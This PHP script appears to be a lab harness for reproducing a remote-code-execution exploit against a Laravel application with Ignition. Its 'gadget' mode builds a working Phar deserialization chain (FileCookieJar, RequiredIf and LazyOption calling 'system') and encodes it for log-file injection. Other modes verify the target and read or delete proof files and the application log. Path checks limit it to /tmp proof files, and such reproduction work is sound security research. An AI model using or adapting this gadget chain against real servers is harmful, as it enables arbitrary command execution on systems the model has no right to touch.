<?php
require '/var/www/vendor/autoload.php';
$app = require '/var/www/bootstrap/app.php';
$app->make(Illuminate\Contracts\Console\Kernel::class)->bootstrap();
$input = json_decode(stream_get_contents(STDIN), true, 512, JSON_THROW_ON_ERROR);
$mode = $argv[1];
function proof_path($path) {
    if (!preg_match('~\A/tmp/module-target-ignition-[a-z0-9_-]+(?:\.phar)?\z~', $path)) {
        throw new InvalidArgumentException('Invalid native proof path');
    }
    return $path;
}
if ($mode === 'verify') {
    $vendor = json_decode(file_get_contents('/opt/module-target-vendor.json'), true, 512, JSON_THROW_ON_ERROR);
    $hashes = [];
    foreach ($vendor['source_sha256'] as $name => $expected) {
        $hashes[$name] = hash_file('sha256', '/var/www/' . $name);
        if (!hash_equals($expected, $hashes[$name])) {
            throw new RuntimeException('Installed source mismatch: ' . $name);
        }
    }
    echo json_encode(['php' => PHP_VERSION, 'laravel' => $app->version(), 'uid' => posix_geteuid(), 'debug' => config('app.debug'), 'environment' => config('app.env'), 'phar_readonly' => ini_get('phar.readonly'), 'log' => config('logging.channels.single.path'), 'source_sha256' => $hashes], JSON_THROW_ON_ERROR);
} elseif ($mode === 'gadget') {
    $path = proof_path($input['archive']);
    $command = base64_decode($input['command_base64'], true);
    if ($command === false || strpos($command, '/tmp/module-target-ignition-') === false || file_exists($path)) {
        throw new InvalidArgumentException('Expected a fresh controlled native proof');
    }
    $lazy = new PhpOption\LazyOption('system', [$command]);
    $condition = new Illuminate\Validation\Rules\RequiredIf([$lazy, 'get']);
    // The real constructor would coerce the filename and execute the proof.
    $reflection = new ReflectionClass(GuzzleHttp\Cookie\FileCookieJar::class);
    $jar = $reflection->newInstanceWithoutConstructor();
    $filename = $reflection->getProperty('filename');
    $filename->setAccessible(true);
    $filename->setValue($jar, $condition);
    $sessions = $reflection->getProperty('storeSessionCookies');
    $sessions->setAccessible(true);
    $sessions->setValue($jar, false);
    try {
        $serialized = serialize($jar);
        $archive = new Phar($path);
        $archive->startBuffering();
        $archive->setStub('<?php __HALT_COMPILER(); ?>');
        $archive->addFromString('proof.txt', 'native-ignition');
        $archive->setMetadata($jar);
        $archive->stopBuffering();
        unset($archive);
        $bytes = file_get_contents($path);
    } finally {
        // Leave the written archive intact, but disarm local destruction.
        $filename->setValue($jar, '/dev/null');
    }
    $transport = str_repeat('A', 100);
    foreach (str_split(base64_encode($bytes)) as $character) {
        $transport .= sprintf('=%02X=00', ord($character));
    }
    echo json_encode(['uid' => posix_geteuid(), 'archive' => $path, 'phar_base64' => base64_encode($bytes), 'serialized_base64' => base64_encode($serialized), 'phar_sha256' => hash('sha256', $bytes), 'transport' => $transport . '=00'], JSON_THROW_ON_ERROR);
} elseif ($mode === 'file' || $mode === 'remove') {
    $path = proof_path($input['path']);
    if ($mode === 'remove' && file_exists($path)) {
        unlink($path);
    }
    echo json_encode(file_exists($path) ? ['exists' => true, 'uid' => fileowner($path), 'base64' => base64_encode(file_get_contents($path))] : ['exists' => false], JSON_THROW_ON_ERROR);
} elseif ($mode === 'log') {
    $path = '/var/www/storage/logs/laravel.log';
    echo json_encode(['exists' => file_exists($path), 'size' => file_exists($path) ? filesize($path) : null, 'uid' => file_exists($path) ? fileowner($path) : null, 'base64' => file_exists($path) ? base64_encode(file_get_contents($path)) : null], JSON_THROW_ON_ERROR);
} else {
    throw new InvalidArgumentException('Unknown native mode');
}
